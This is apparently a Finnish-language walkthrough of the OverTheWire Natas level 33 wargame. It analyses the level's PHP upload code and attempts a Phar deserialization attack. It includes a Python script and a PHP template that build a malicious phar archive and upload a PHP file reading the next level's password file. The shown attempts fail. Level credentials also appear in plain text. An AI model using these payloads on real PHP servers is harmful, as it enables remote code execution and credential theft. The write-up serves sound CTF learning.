# natas 33 - START HERE;

natas33 - 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ

Natas33 perus tietojen upottaminen ja näyttävän on kyseessä joku **Firmware** (Suom. laiteohjelmisto) tiedosto upottaminen - etusivun mukaan.

- Kokeiltu upottaa esim. screenshot kuvakaappaus - ainakin toi *md5_file* jotakin error tai joku error ilmoitus *There was an error uploading the file, please try again!* 
- yritin upottaa jopa excel taulukon, että antoi pientä vinkkiä ja error ilmoituksensa: */natas33/upload/g8q7ck7a506hbt8j0pvn2oqe7m Firmware upgrad initialised.* 
- jos upotan suurempaa dataa


## view-source ja teoriat

Tästä view-source html koodattu tästä vähä lisätietoa.


Tämä on koodattu PHP-koodikielellä alkuun käytett class (luokka) muotoa ja allekirjoitus mikälie onkaan voiko olla jotakin satunnaista tekstiä. 

```
class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;
```

Tässä tapahtuu tiedoston upottaminen, että mahdollinen maksimi on **4096 bittiä (bytes)** ja jos on yli siitä niin kertoo kyseinen tiedosto on liian iso ja sama pätee se skannaa sen tiedoston jotta täsmentyy firmware laiteohjelmistoa. Jos tiedosto ei päde siihen polkuun eli tiedoston upottamiseen se kertoo kyseinen tiedostossa on error tai on väärin.

```
function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }
```

Tässä funktiossa sitten jos löytää mahdollisen niin se suorittaa sen tiedoston ja runnaa sen ja jos täsmentyy kemiat yhteen.

```
function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
```

Loppu osassa siinä on mainittu tämä `echo session_id()` - evästeen ID:tä, joka tarkoittaa tiedoston upotaessa se vastaavan natas33:sen eväste PHPSESSID:tä.
```
            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
```


**eli mikä idea**
- Luoda alle 4KB:n php tiedosto, jonka sisältö tuottaa täsmälleen tuodun **md5-summan** ja tämä tiedosto lähettää palvelimelle suorittakseen tiedoston ja tulostaa salasanan seuraavaan tasoon.

- Ongelmia ehdottomasti löytyy, joka on MD5-tiiviste joka on **yksisuuntainen tiivistefunktio**.


Tässä if-else lausessa on koskien **md5_file** funktiota, jos tulos on yhtä suuri kuin `adeafbadbabec0dedabada55ba55d00d` signature-arvo niin tiedosto suoritetaan. Jos ei, tiedosto suoriteaan virheilmoituksia ja toiminto epäonnistuu. 
```
if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
```



## hyökkäysmentelmä

Tässä natas33 tasossa tapahtuu siis **Phar deserialization attack** menetelmä. **Phar-hyökkäys** tarkoittaa, että hyökkääjä luo valetiedoston (Phar-arkisto), **joka sisältää piilotettua PHP-koodia** tai olioita, jotka suoritetaan vahingossa, kun palvelin avaa tiedoston jollain viattomalla funktiolla, kuten `md5_file()`.

Tämä on pieni vaiheittainen steppi se hyökkäys, mitä siinä Phar tiedoston alla voi olla siis:
- erityisiä metadataa (piilotietoa)
- metadatan tähän sisältää PHP-ohjelmointikieltä tehtyjä olioita


Tiivistettynä ja helppo ymmärtää hyökkäys menetelmänsä: 
- Phar deserialization attack on tapa piilottaa haitallista ohjelmakoodia tiedoston sisään niin, että palvelin suorittaa sen vahingossa, kun se yrittää vain "katsoa" tiedostoa — kuten laskiessaan sen MD5-tiivistettä.
- Phar deserialization attack perustuu siihen, että PHP lukee ja suorittaa metadatassa olevan PHP-olion. Ei esim. Python-objektia tai JSON-dataa tai mitään muuta.
- Phar voi sisältää mitä tahansa tiedostoja, mutta haitallinen metadata täytyy olla PHP-olion serialisoitu muoto, koska hyökkäys perustuu PHP:n `unserialize()`-toimintoon.

## kali linux - start here

natas33 - 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ


```
┌──(kali㉿kali)-[~]
└─$ curl http://natas33.natas.labs.overthewire.org/ --user natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

                        <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="5tp8uotc0g5fshm68rl63cmq0e" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>

┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://nata34.natas.labs.overthewire.org/" http://natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ@natas33.natas.labs.overthewire.org
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

                        <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="2bd5nam2nsc91b57lv4mu9gveg" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```


## muita testejä

- url perään laitettu `/file/` & `/robots.txt` ja sama pätee linux tiedosto menetelmä `/etc/natas_webpass/natas34` - ei tuo mitään eli "Not Found"
- avattu F12 (application) polku, josta toi tämä "no service workers found" eli ei löydeätty evästeittä.


## solution ratkaisu vaihtoehtoja

Eli ratkaisuna on luoda PHP kaltainen tiedosto, mikä tästä on tehty kuin aikaisempi, muttak uitenkin toisenlainen PHP serialisoinnin poisto-/serialisoinnin poistohyökkäys), meidän on luotava PHP-objekti, jota käytetään hyökkäyksessä. Näitä ratkaisuja on tosi paljon, mutta kokeillaan ja testatan vaihtoehtoja, että näitä ei ole oikeata tai väärää ratkaisua kunhan päästään ja saadaan seuraave natas34 tason salasana.

### python metodi

Tämä python koodi ideana on lukea URL natas33 tason sivustoa, että perus autentikointina salasanaa, että päästäkseen Linux tiedosto ja siihen URL polkuun, että löytää natas34 tasonsa olemassa. Kuitenkin ideana on suorittaa tämä POST tiedoston upottaminen, että täsmentyvä tiedoston koko eli 4096 bittiä.

Tuossa yhdessä python koodi rivissä lukeekin, että se pitää avata "natas33.php.template" yksi php koodi pätkä - josta toimii kuin upottaisi tiedostonsa natas33 tason alle.

python koodi:

```
import requests
import hashlib
import subprocess

url = 'http://natas33.natas.labs.overthewire.org/'

auth = ('natas33', '2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ')

content = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
content_hash = hashlib.md5(content).hexdigest()
filename = 'rce.php'

with open('natas33.php.template', 'r') as template:
    with open('natas33.php', 'w') as o:
        o.write(template.read().format(filename, content_hash))

output = subprocess.check_output(['php', '-d', 'phar.readonly=false', 'natas33.php'])

# Upload your rce script and overwrite the filename field to have the file accesible for the next step.
requests.post(url + '/index.php', auth=auth,
              data={'filename': filename, 'submit': 'Upload File'},
              files={'uploadedfile': content})

# Upload the generated phar file but instead of giving a file name, use the protocol handler.
response = requests.post(url + '/index.php', auth=auth, data={'filename': 'phar://test.phar/test.txt', 'submit': 'Upload File'}, files={'uploadedfile': open('test.phar', 'rb')})
print(response.text)
```

php koodi ja tarkennuksensa se pitää lukea se tiedosto, että kantsii nimettä kokonaisena "natas33.php.template":

```
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
class Executor{{
  private $filename='{}';
  private $signature='{}';
}}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>
```

jotakin ainakin tapahtui, mutta toi pientä erroria??
```
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ python natas33.py 
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <br />
<b>Warning</b>:  move_uploaded_file(/natas33/upload/phar://test.phar/test.txt): failed to open stream: No such file or directory in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpZt2JUM' to '/natas33/upload/phar://test.phar/test.txt' in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
There was an error uploading the file, please try again!<br><br />
<b>Warning</b>:  md5_file(phar://test.phar/test.txt): failed to open stream: phar error: invalid url or non-existent phar &quot;phar://test.phar/test.txt&quot; in <b>/var/www/natas/natas33/index.php</b> on line <b>42</b><br />
Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="vescnaasuvlkdh897t6i4ighnk" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

vescnaasuvlkdh897t6i4ighnk - tämä ei ole ainakaan salasana, ja se on upotettavan tiedoston vastaava PHPSESSID.

```
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ ls
natas33.php  natas33.php.template  natas33.py  test.phar
                                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ cat test.phar 
<?php __HALT_COMPILER(); ?>
�~O:8:"Executor":2:{s:18:"Executorfilename";s:7:"rce.php";s:19:"Executorsignature";s:32:"8a54d751b7e2bbbb2643d355d49e81be";test.txtǧ�;�textFU��L�U'O'SK�}���%�},����r���GBMB                                                                                                                                    
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ cat natas33.php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
class Executor{
  private $filename='rce.php';
  private $signature='8a54d751b7e2bbbb2643d355d49e81be';
}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>

```

Tämä tässä nyt "  private $signature='8a54d751b7e2bbbb2643d355d49e81be';" ei täsmeny Natas33 sivuston index-source koodi ppätkäänsä..

## testit jatkuu


tästä ainakin upotettu tiedosto tuohon sivustonsa, että saattiinko oikea vastausta ja testattu (EI OLE) - matka jatkuu. Eli tosiaan upotettu php templates tiedosto, mutta se ei toiminut ja sama pätee python koodi ,ettei tulosta antanutkaan.
```
The update has been uploaded to: /natas33/upload/497a7spfs5a8vkq8ivujkrr6be
Firmware upgrad initialised.
Failur! MD5sum mismatch!
Upload Firmware Update:
```

Tässä koodi pätkässä kuitenkin pitää saada tai tuo jotakin tiedostojen upottamista polkuunsa, että hakee tämän tiedoston nimikkeen.. 

```
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
```

mutta jos `md5_file()` täsmentyy tuohon tiedoston `$signature` objektii mikälie niin pitäisi tulla tämä täsmentyvä tekijä eli >> private $signature='adeafbadbabec0dedabada55ba55d00d';

```
// "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
```


yritin uudestaan ajaa tämä python koodi, että ainakin näyttävän toi PHPSESSID on vain eri eli (`dppl5h4d7tctrnim84cb5cip4k`), mutta taas luettua php koodi pätkä että signature tämä koodi (8a54d751b7e2bbbb2643d355d49e81be) verrattuna aikaisempaan on sama.

```
┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ python natas33.py
<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <br />
<b>Warning</b>:  move_uploaded_file(/natas33/upload/phar://test.phar/test.txt): failed to open stream: No such file or directory in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpjKa1pH' to '/natas33/upload/phar://test.phar/test.txt' in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
There was an error uploading the file, please try again!<br><br />
<b>Warning</b>:  md5_file(phar://test.phar/test.txt): failed to open stream: phar error: invalid url or non-existent phar &quot;phar://test.phar/test.txt&quot; in <b>/var/www/natas/natas33/index.php</b> on line <b>42</b><br />
Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="dppl5h4d7tctrnim84cb5cip4k" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>


┌──(kali㉿kali)-[~/Desktop/natas33]
└─$ cat natas33.php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');
class Executor{
  private $filename='rce.php';
  private $signature='8a54d751b7e2bbbb2643d355d49e81be';
}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>
```

## burp suite

Tämä on burpsuite on päivittynyt tosi paljon, jos vertailee aikaisempia toisten ratkaisempia burp suite ohjeiden mukaan voi olla saa ratkaistettua mutta vie paljon aikaa ja ongelmanratkaisuun.. (kokeillaan toinen kerta), mutta tästä lisätty kuvia ja siinä alla on oma AI jopa.

















